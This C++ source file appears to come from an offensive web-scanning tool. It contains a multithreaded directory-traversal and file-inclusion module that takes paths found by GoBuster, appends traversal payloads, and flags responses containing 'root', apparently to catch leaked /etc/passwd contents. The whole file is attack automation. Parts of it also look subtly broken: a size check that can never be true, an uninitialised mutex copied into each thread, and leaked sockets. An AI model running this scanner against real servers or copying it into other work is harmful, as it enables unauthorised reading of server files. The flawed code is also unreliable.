#include "../../include/exploit/dir_traversal.h"
// [TODO:] if there is a segmentation fault look for vector in function ""
std::vector<std::string> page_paths;

void print_dir_traversal(std::string message, int COLOR, pthread_mutex_t *lock){
	pthread_mutex_lock(lock);
	print (message,COLOR);
	pthread_mutex_unlock(lock);
}

DIR_TRAVERSAL::DIR_TRAVERSAL(std::string hostname, int PORT){
	this->hostname = hostname;
	this->PORT = PORT;
}


void DIR_TRAVERSAL::directory_traversal(std::string page_path){
	std::string response, temp_page_path, headers, matching_string = "root";
	size_t file_inclusion_size = file_inclusion_query.size();
	Sock *file_inc_sock;
	for(size_t i = 0; i < file_inclusion_size ;i++) {
		temp_page_path = page_path + file_inclusion_query.at(i);
		file_inc_sock = new Sock(hostname, PORT);
		file_inc_sock->sendrequest(temp_page_path, response);
		if(response.size() < 0) continue;
		if(response_filter(response,matching_string)){
				print(temp_page_path,3);
				print(response,2);
		}
	}
}

void *thread_dir_check(void *thread_data){
	struct thread_data *this_thread_data;
	std::string response, print_message, page_path_string,temp_page_path_string,  headers, form_action;
	std::vector<std::string> return_vector;
	bool has_input_field;
	int status_code,form_type;
	Sock *file_inc_sock;
	this_thread_data = (struct thread_data *) thread_data;

	while(1){
		pthread_mutex_lock(&this_thread_data->lock);
		if(page_paths.empty()){
			print ("breaked");
			pthread_mutex_unlock(&this_thread_data->lock);
			break;
		}

		page_path_string = page_paths.back();
		page_paths.pop_back();
		pthread_mutex_unlock(&this_thread_data->lock);
		file_inc_sock = new Sock(this_thread_data->hostname, 80);
		file_inc_sock->sendrequest(page_path_string, response);
		if(response.size() < 0) continue;
		parse_html_code(response, headers, status_code);
		form_type = 0;
		has_input_field = false;
		search_for_input_field(response,return_vector, has_input_field, form_type, form_action);
		DIR_TRAVERSAL *file_obj = new DIR_TRAVERSAL(this_thread_data->hostname, this_thread_data->PORT_NUMBER);
		file_obj->directory_traversal(page_path_string);
	}
	pthread_exit(NULL);
}


void dir_check(std::string & hostname, int PORT_NUMBER, int THREADS){
	std::ifstream fin;
	std::string filename = Save_LOCATION;
	filename += hostname + FILE_EXTENSION;
	std::string line, response, headers, test_string, authorised_token  = "";
	std::string matching_string = "Oops. The Page you requested does not exist.";
	int begin, rc, flag = 0;
	struct thread_data td[THREADS];
	pthread_t threads[THREADS];
	pthread_mutex_t lock;

	fin.open(filename);

	if (!fin.is_open()){
		print ("host has no file saved or not collected any data from information step ",1);
		return;
	}

	get_hostname(hostname);
	test_string = file_inclusion_query[1];
	print("Running Direcotry tranversal ...",6);

	while(std::getline(fin, line)){
		if(line == ">>>> GoBuster Results "){
			flag = 1;
		}
		else if(line == "<<<<" && flag == 1)
				break;
		else if(flag == 1){
			begin = line.find(": ");
			begin = line.find(" (");
			line.replace(begin, (int) line.size(), "");
			page_paths.push_back(line);
		}
	}
	fin.close();
	for (int i = 0; i < THREADS; i++) {
		td[i].thread_id = i;
		td[i].hostname = hostname;
		td[i].PORT_NUMBER = PORT_NUMBER;
		td[i].token = authorised_token;
		td[i].lock = lock;

		rc = pthread_create(&threads[i], NULL, thread_dir_check, (void *)&td[i]);
		if (rc) {
			      std::cout << "Error:unable to create thread," << rc;
			       exit(-1);
			    }

	}
	for (int i = 0; i < THREADS; i++)
		pthread_join(threads[i], NULL);

	pthread_mutex_destroy(&lock);
	pthread_exit(NULL);
}




